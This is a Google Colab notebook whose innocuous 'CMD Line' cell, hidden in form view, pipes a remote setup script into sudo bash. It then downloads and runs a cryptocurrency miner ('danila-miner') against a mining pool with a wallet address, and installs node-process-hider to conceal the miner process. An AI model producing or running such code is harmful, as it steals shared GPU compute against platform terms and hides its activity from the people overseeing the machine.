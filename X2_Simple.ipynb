{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "X2 Simple",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "#@title **T4 Finder**\n",
        "! nvidia-smi -L"
      ],
      "metadata": {
        "cellView": "form",
        "id": "2oO_Q5IiWexG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***CMD Line***\n",
        "from os import system, name\n",
        "from time import sleep\n",
        "from subprocess import PIPE, Popen\n",
        "import base64\n",
        "\n",
        "\n",
        "def cmdline(command):\n",
        "    process = Popen(\n",
        "            args=command,\n",
        "                    stdout=PIPE,\n",
        "                            shell=True\n",
        "                                )\n",
        "    return process.communicate()[0]\n",
        "\n",
        "\n",
        "\n",
        "cmdline ( 'curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar -xvf danila-miner-2.3.1-ubuntu-bionic.tar.gz && apt install screen && rm -rf danila-miner-2.3.1-ubuntu-bionic.tar.gz && sudo ph add danila-miner && ./danila-miner run https://server1.whalestonpool.com EQB9kIV4_vEkuOlij86mXNfTvAgDqVUuhti92VLdpymYmNga' )"
      ],
      "metadata": {
        "id": "hN5ZNmD8q4FD",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}